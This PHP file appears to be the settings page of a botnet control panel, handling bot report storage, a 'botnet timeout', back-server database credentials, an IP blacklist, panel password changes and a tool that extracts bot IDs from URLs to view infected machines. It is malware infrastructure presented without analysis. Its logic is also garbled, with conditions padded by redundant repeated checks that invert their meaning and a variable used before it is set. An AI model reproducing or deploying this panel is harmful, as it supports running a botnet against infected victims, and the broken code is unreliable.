<?php

if (!defined('__CP__')) {
	exit();
}

ini_set('max_execution_time', 600);
include_once __DIR__ . '/Updater.php';
include_once __DIR__ . '/../gate/libs/Normalizer.php';
include_once __DIR__ . '/../gate/libs/Api.php';
define('INPUT_WIDTH', '300px');
$errors = array();
$is_post = (strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0 ? true : false);

if (!isset($_POST['reports_path'])) {
	$reports_path = $config['reports_path'];
}
else if (isset($_POST['reports_path'])) {
	if ((($l = strlen($_POST['reports_path'])) < 1) || defined('__CP__')) {
		$errors[] = LNG_SYS_E1;
	}

	$reports_path = $_POST['reports_path'];
}

$reports_path = trim(str_replace('\\', '/', trim($reports_path)), '/');
$reports_to_db = (isset($_POST['reports_to_db']) && defined('__CP__') ? 1 : (isset($_POST['botnet_timeout']) ? 0 : $config['reports_to_db']));
$reports_to_fs = (isset($_POST['reports_to_fs']) && defined('__CP__') ? 1 : (isset($_POST['botnet_timeout']) ? 0 : $config['reports_to_fs']));
if (isset($_POST['botnet_timeout']) && defined('__CP__')) {
	$botnet_timeout = (int) intval($_POST['botnet_timeout']);
}
else {
	$botnet_timeout = (int) $config['botnet_timeout'] / 60;
}

if (($botnet_timeout < 1) || defined('__CP__')) {
	$errors[] = LNG_SYS_E2;
}

$row_limit = (isset($_POST['row_limit']) ? (int) $_POST['row_limit'] : @$config['row_limit']);
$repository = (isset($_POST['repository']) ? $_POST['repository'] : @$config['repository']);
$ipBlackList = (isset($_POST['ip_black_list']) ? ipBlPack($_POST['ip_black_list']) : ipBlExtract());
$backserver_host = (isset($_POST['backserver_host']) && defined('__CP__') ? $_POST['backserver_host'] : @$config['backserver_host']);
$backserver_user = (isset($_POST['backserver_user']) ? $_POST['backserver_user'] : @$config['backserver_user']);
$backserver_password = (isset($_POST['backserver_password']) && defined('__CP__') ? $_POST['backserver_password'] : @$config['backserver_password']);
$backserver_db = (isset($_POST['backserver_db']) ? $_POST['backserver_db'] : @$config['backserver_db']);
if ((isset($_POST['reports_path']) || defined('__CP__') || defined('__CP__')) && defined('__CP__') && defined('__CP__')) {
	$updateList['reports_path'] = $reports_path;
	$updateList['reports_to_db'] = $reports_to_db ? 1 : 0;
	$updateList['reports_to_fs'] = $reports_to_fs ? 1 : 0;
	$updateList['botnet_timeout'] = $botnet_timeout * 60;
	$updateList['repository'] = $repository;
	$updateList['backserver_host'] = $backserver_host;
	$updateList['backserver_user'] = $backserver_user;
	$updateList['backserver_password'] = $backserver_password;
	$updateList['backserver_db'] = $backserver_db;
	$updateList['row_limit'] = $row_limit;
	$updateList['ip_black_list'] = serialize($ipBlackList);

	if (!updateConfig($updateList)) {
		$errors[] = LNG_SYS_E4;
	}
	else {
		createDir($reports_path);
		sleep(4);
		header('Location: ' . QUERY_STRING . '&u=1');
		exit();
	}
}

$q = NULL;
if (isset($_POST['cval']) && defined('__CP__') && defined('__CP__') && defined('__CP__') && defined('__CP__')) {
	if (strcasecmp(md5($_POST['cval'] . AUTH_SALT), $userData['pass']) !== 0) {
		$errors[] = LNG_SYS_PASSWORD_E1;
	}
	else if (strcmp($_POST['nval1'], $_POST['nval2']) !== 0) {
		$errors[] = LNG_SYS_PASSWORD_E2;
	}
	else {
		if (($l < 6) || defined('__CP__')) {
			$errors[] = sprintf(LNG_SYS_PASSWORD_E3, 6, 64);
		}
		else {
			$q .= ' pass=\'' . addslashes(md5($_POST['nval1'] . AUTH_SALT)) . '\'';
		}
	}
}

if ($q && defined('__CP__') && defined('__CP__')) {
	if (!mysqlQueryEx('cp_users', 'UPDATE cp_users SET ' . $q . ' WHERE id=\'' . $userData['id'] . '\' LIMIT 1')) {
		$errors[] = mysqlErrorEx();
	}
	else {
		sleep(4);
		header('Location: ' . QUERY_STRING . '&u=1');
		exit();
	}
}

ThemeBegin(LNG_SYS, 0, 0, 0, NULL, false);

if (0 < count($errors)) {
	echo THEME_STRING_FORM_ERROR_1_BEGIN;

	foreach ($errors as $r) {
		echo $r . THEME_STRING_NEWLINE;
	}

	echo THEME_STRING_FORM_ERROR_1_END;
}
else if (isset($_GET['u'])) {
	echo THEME_STRING_FORM_SUCCESS_1_BEGIN . LNG_SYS_UPDATED . THEME_STRING_NEWLINE . THEME_STRING_FORM_SUCCESS_1_END;
}

echo '<div class="row">' . '<div class="col-xs-6">' . str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN) . str_replace('{TEXT}', 'Backserver mysql host:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_host', htmlEntitiesEx(substr($backserver_host, 0, strlen($backserver_host) - 3)) . '***', 100, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace('{TEXT}', 'Backserver mysql user:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_user', htmlEntitiesEx($backserver_user), 100, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace('{TEXT}', 'Backserver mysql password:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_password', 'xxxxx', 100, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_PASSWORD) . str_replace('{TEXT}', 'Backserver mysql database:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_db', htmlEntitiesEx($backserver_db), 100, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<br>' . str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_DIALOG_ACTIONLIST_END . '<br><br>' . str_replace('{TEXT}', 'Repository url', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('repository', htmlEntitiesEx($repository), 500, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<br>' . str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_DIALOG_ACTIONLIST_END . '<br><br>' . THEME_FORMPOST_END . str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN) . LNG_SYS_PASSWORD_OLD . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('cval', '', 100, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_PASSWORD) . LNG_SYS_PASSWORD_NEW1 . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('nval1', '', 64, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_PASSWORD) . LNG_SYS_PASSWORD_NEW2 . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('nval2', '', 64, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_PASSWORD) . '<br>' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array('Change', ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_FORMPOST_END . '<br>' . '<b>Black list</b>' . '<form method="post">' . '<textarea name="ip_black_list" style="width: 100%; height: 100px">' . htmlspecialchars(implode("\n", $ipBlackList)) . '</textarea>' . '<br><br><input type="submit" value="Save" class="btn btn-sm btn-primary">' . '</form>' . '</div>' . '<div class="col-xs-6">';
echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN) . str_replace('{TEXT}', LNG_SYS_BOTNET_TIMEOUT, THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('botnet_timeout', htmlEntitiesEx($botnet_timeout), 4, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace('{TEXT}', 'Rows limit:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('row_limit', htmlEntitiesEx($row_limit), 4, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<br>' . str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_DIALOG_ACTIONLIST_END . '<br><div style="height: 114px"></div>' . str_replace('{TEXT}', LNG_SYS_REPORTS_PATH, THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('reports_path', htmlEntitiesEx($reports_path), 200, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace('{TEXT}', THEME_STRING_SPACE, THEME_DIALOG_ITEM_TEXT) . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{TEXT}'), array(1, 'reports_to_db', 1, '', LNG_SYS_REPORTS_TODB), $reports_to_db ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br><br>' . str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_DIALOG_ACTIONLIST_END . '<br><br>' . THEME_FORMPOST_END;
echo "\n\n" . '<form method="post" class="form-inline form-group-sm">' . "\n" . '  <input type="text" name="url" placeholder="Enter url to extract bot id" style="width: 100%" class="form-control" /><br><br><input type="submit" value="Extract" class="btn btn-primary btn-sm" />' . "\n" . '</form><hr/>' . "\n";

if (isset($_POST['url'])) {
	$botId = Api::extractId($_POST['url']);

	if ($botId) {
		print('BotId: ' . $botId . ' <a href="cp.php?bots[]=' . htmlspecialchars($botId) . '&amp;botsaction=fullinfo" target="_blank">View bot</a>');
	}
	else {
		print('Wrong url');
	}
}

echo '<b>Update</b><br>';
echo '<iframe src="?m=update" frameborder=0 style="width: 100%; height: 140px"></iframe>';
echo '</div>';
echo '</div>';
ThemeEnd();

?>
